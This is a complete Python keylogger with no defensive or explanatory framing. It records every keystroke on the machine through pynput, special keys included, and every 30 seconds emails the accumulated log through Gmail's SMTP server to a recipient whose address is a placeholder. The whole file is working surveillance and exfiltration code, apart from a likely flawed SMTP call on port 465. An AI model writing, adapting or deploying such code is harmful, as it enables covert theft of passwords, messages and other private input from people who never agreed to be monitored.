import pynput.keyboard
import threading
import signal
import sys
from termcolor import colored
import smtplib
from email.mime.text import MIMEText

def def_handler(sig, frame):
    print(colored(f'\n[+] Stopping keylogger...', 'red'))
    keylogger.shutdown()
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

class Keylogger:
    def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.timer = None
        self.is_first_run = True

    def pressed_key(self, key):
        global log

        try:
            self.log += str(key.char)
        except AttributeError:
            special_keys = {
                key.space: " ",
                key.backspace: " Backspace ",
                key.enter: " Enter ",
                key.tab: " Tab ",
                key.shift: " Shift ",
                key.alt: " Alt "
            }

            self.log += special_keys.get(key, f" {str(key)} ")

    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

        print(colored(f'\n[+] Email sent successfully!\n', 'green'))


    def report(self):
        email_body = "[+] Keylogger started successfully!" if self.is_first_run else self.log
        self.send_email("Keylogger Report", email_body,
                        "<EMAIL>",
                        ["<EMAIL>"],
                        "<PASSWORD>")
        self.log = ""

        if self.is_first_run:
            self.is_first_run = False

        if not self.request_shutdown:
            self.timer = threading.Timer(30, self.report)
            self.timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()

    def shutdown(self):
        self.request_shutdown = True

        if self.timer:
            self.timer.cancel()

if __name__ == '__main__':
    keylogger = Keylogger()
    keylogger.start()